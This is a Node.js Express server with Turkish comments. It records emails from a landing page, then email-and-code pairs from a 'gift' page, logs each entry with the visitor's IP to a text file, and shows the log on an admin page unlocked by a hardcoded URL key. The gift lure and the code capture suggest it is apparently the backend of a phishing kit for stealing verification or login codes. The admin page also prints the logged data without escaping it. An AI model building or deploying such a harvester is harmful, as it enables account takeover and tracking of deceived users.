
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Admin paneline giriş için gizli anahtar (Tarayıcıda: /admin?key=anahtar)
const ADMIN_KEY = 'benim-gizli-anahtarim';

// Statik dosyaları (index.html, gift.html) 'public' klasöründen okur
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '1mb' }));
app.use(cors());

const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.txt');

// --- YARDIMCI FONKSİYONLAR ---

function formatEntry(type, data) {
  const time = new Date().toLocaleString('tr-TR');
  if (type === 'EMAIL') {
    return `[${time}] | IP: ${data.ip} | YENİ GİRİŞ: ${data.email}\n`;
  } else {
    return `[${time}] | IP: ${data.ip} | KOD GÖNDERİLDİ: Email=${data.email} | Kod=${data.code}\n`;
  }
}

// --- ENDPOINT'LER ---

// 1. E-posta Kaydı (index.html'den gelir)
app.post('/submit', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const { email } = req.body || {};

  if (!email || !email.includes('@')) {
    return res.status(400).json({ ok: false, message: 'Geçersiz e-posta.' });
  }

  const entry = formatEntry('EMAIL', { email, ip });

  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
    if (err) return res.status(500).json({ ok: false });
    return res.json({ ok: true });
  });
});

// 2. Kod Kaydı (gift.html'den gelir)
app.post('/submit-code', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const { email, code } = req.body || {};

  if (!email || !code) {
    return res.status(400).json({ ok: false, message: 'E-posta ve kod zorunlu.' });
  }

  const entry = formatEntry('CODE', { email, code, ip });

  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
    if (err) return res.status(500).json({ ok: false });
    return res.json({ ok: true });
  });
});

// 3. Admin Paneli (Kayıtları görüntülemek için)
app.get('/admin', (req, res) => {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(403).send('Yetkisiz erişim.');
  }

  fs.readFile(SUBMISSIONS_FILE, 'utf8', (err, data) => {
    const content = err ? 'Henüz kayıt yok.' : data;
    const html = `
      <html>
        <head><title>Admin Panel</title><meta charset="utf-8"></head>
        <body style="font-family:monospace; background:#111; color:#0f0; padding:20px;">
          <h2>Gelen Veriler (submissions.txt)</h2>
          <hr>
          <pre>${content}</pre>
          <br>
          <a href="/download?key=${ADMIN_KEY}" style="color:white;">Dosyayı İndir (.txt)</a>
        </body>
      </html>
    `;
    res.send(html);
  });
});

// 4. Dosya İndirme
app.get('/download', (req, res) => {
  if (req.query.key !== ADMIN_KEY) return res.status(403).send('Yetkisiz.');
  res.download(SUBMISSIONS_FILE);
});

app.listen(PORT, () => {
  console.log(`Sunucu aktif: http://localhost:${PORT}`);
});

